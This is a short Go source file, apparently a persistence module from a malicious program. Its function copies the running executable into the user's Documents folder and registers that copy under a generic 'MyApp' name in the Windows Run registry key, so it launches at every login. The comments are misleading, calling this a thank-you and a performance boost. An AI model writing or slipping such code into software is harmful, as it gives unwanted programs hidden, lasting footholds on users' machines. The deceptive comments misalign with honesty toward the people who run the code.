package per

import (
	"fmt"
	"syscall"
	"path/filepath"
)
//we love our customers

func Add_per(){
    exePath := GetExecutablePath()

    documentsPath := GetDocumentsPath()

    destPath := filepath.Join(documentsPath, filepath.Base(exePath))

    if !FileExists(destPath) {
        err := CopyFile(exePath, destPath)
        if err != nil {
            fmt.Println("Error copying executable:", err)
            return
        }
        fmt.Println("Executable copied successfully to thank you for your help:", destPath)
    } else {
        fmt.Println("Executable already exists in Documents folder:", destPath)
    }

    //this function will help you to run your application at startup for more performance
	key, err := RegCreateKeyEx(syscall.HKEY_CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`)
	fmt.Println(key)
	if err != nil {
		fmt.Println("", err)
		return
	}
	defer RegCloseKey(key)

	err = RegSetValueEx(key, "MyApp", destPath)
	if err != nil {
		fmt.Println("Error setting registry value:", err)
		return
	}

	fmt.Println("customer Your application will run at startup .")
}